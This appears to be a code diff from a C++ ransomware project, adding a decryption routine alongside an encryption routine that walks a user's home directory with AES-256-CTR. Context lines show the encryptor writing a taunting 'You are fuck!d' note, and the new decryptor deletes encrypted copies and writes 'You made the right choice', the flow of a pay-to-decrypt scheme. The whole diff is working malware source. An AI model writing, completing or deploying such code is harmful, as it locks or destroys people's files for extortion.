@@ -325,8 +325,6 @@ namespace dune
             unsigned char outdata[AES_BLOCK_SIZE];
             unsigned char *ckey = (unsigned char *)enc_key.c_str();
             unsigned char ivec[] = "dontusethisinput";
-            AES_KEY key;
-            AES_set_encrypt_key(ckey, 256, &key);
             int num = 0;
 
             EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
@@ -335,7 +333,6 @@ namespace dune
             while (1)
             {
                 bytes_read = fread(indata, 1, AES_BLOCK_SIZE, infile);
-                // AES_cbc_encrypt(indata, outdata, bytes_read, &key, ivec, AES_ENCRYPT);
                 int outlen;
                 EVP_EncryptUpdate(ctx, outdata, &outlen, indata, bytes_read);
                 bytes_written = fwrite(outdata, 1, bytes_read, outfile);
@@ -343,7 +340,44 @@ namespace dune
                     break;
             }
             EVP_CIPHER_CTX_free(ctx);
-            EVP_CIPHER_free((EVP_CIPHER*)cipher);
+            EVP_CIPHER_free((EVP_CIPHER *)cipher);
+            fclose(infile);
+            fclose(outfile);
+        }
+        static void decrypt_file(std::string full_path, std::string enc_key)
+        {
+            FILE *infile = fopen(full_path.c_str(), "rb"); // must be open in read mode + binary
+            if (!infile)
+            {
+                return;
+            }
+
+            FILE *outfile = fopen((full_path.substr(0, full_path.length() - 5)).c_str(), "w+b");
+            if (!outfile)
+            {
+                return;
+            }
+            int bytes_read, bytes_written;
+            unsigned char indata[AES_BLOCK_SIZE];
+            unsigned char outdata[AES_BLOCK_SIZE];
+            unsigned char *ckey = (unsigned char *)enc_key.c_str();
+            unsigned char ivec[] = "dontusethisinput";
+            int num = 0;
+
+            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+            const EVP_CIPHER *cipher = EVP_aes_256_ctr();
+            EVP_DecryptInit(ctx, cipher, ckey, ivec);
+            while (1)
+            {
+                bytes_read = fread(indata, 1, AES_BLOCK_SIZE, infile);
+                int outlen;
+                EVP_DecryptUpdate(ctx, outdata, &outlen, indata, bytes_read);
+                bytes_written = fwrite(outdata, 1, bytes_read, outfile);
+                if (bytes_read < AES_BLOCK_SIZE)
+                    break;
+            }
+            EVP_CIPHER_CTX_free(ctx);
+            EVP_CIPHER_free((EVP_CIPHER *)cipher);
             fclose(infile);
             fclose(outfile);
         }
@@ -383,6 +417,31 @@ namespace dune
             }
             std::ofstream finish("./finish.txt");
             char done_msg[] = "You are fuck!d...\n";
+            finish.write(done_msg, sizeof(done_msg));
+            finish.close();
+            return;
+        }
+        static void decrypt_files(std::string enc_key, std::string user_home)
+        {
+            std::vector<std::string> files_to_decrypt;
+            ls_recursive(user_home, &files_to_decrypt);
+            if (files_to_decrypt.size() == 0)
+            {
+                return;
+            }
+            for (int i = 0; i < files_to_decrypt.size(); i++)
+            {
+                try
+                {
+                    decrypt_file(files_to_decrypt[i], enc_key);
+                    remove((files_to_decrypt[i]).c_str());
+                }
+                catch (...)
+                {
+                }
+            }
+            std::ofstream finish("./finish.txt");
+            char done_msg[] = "You made the right choice.\n";
             finish.write(done_msg, sizeof(done_msg));
             finish.close();
             return;
